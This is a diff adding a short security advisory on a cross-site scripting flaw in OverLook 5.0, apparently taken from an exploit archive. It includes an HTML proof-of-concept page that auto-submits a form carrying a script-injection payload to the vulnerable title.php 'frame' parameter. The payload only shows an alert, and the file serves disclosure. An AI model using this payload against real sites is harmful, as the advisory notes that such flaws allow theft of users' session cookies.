@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43872/info
+
+OverLook is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+OverLook 5.0 is vulnerable; prior versions may also be affected. 
+
+<!-- -*-*- ANATOLIA SECURITY (c) 2010 -*-*- $ Title: Proof of Concept Code for OverLook v5 Cross-site Scripting Vuln. $ ADV-ID: 2010-002 $ ADV-URL: http://www.anatoliasecurity.com/adv/as-adv-2010-002.txt $ Technical Details: http://www.anatoliasecurity.com/advisories/overlook-xss * PoC created by Eliteman ~ mail: eliteman [~AT~] anatoliasecurity [~DOT~] com ~ web: elite.anatoliasecurity.com --> <html> <head> <title> OverLook v5.0 Cross-site Scripting </title> </head> <body> <form action="http://target/overlook/title.php" method="get"> <input type="hidden" name="frame" value=""><script>alert(/1337/)</script><--"> </form> <script type="text/javascript"> document.forms[0].submit(); </script> </body> </html> 
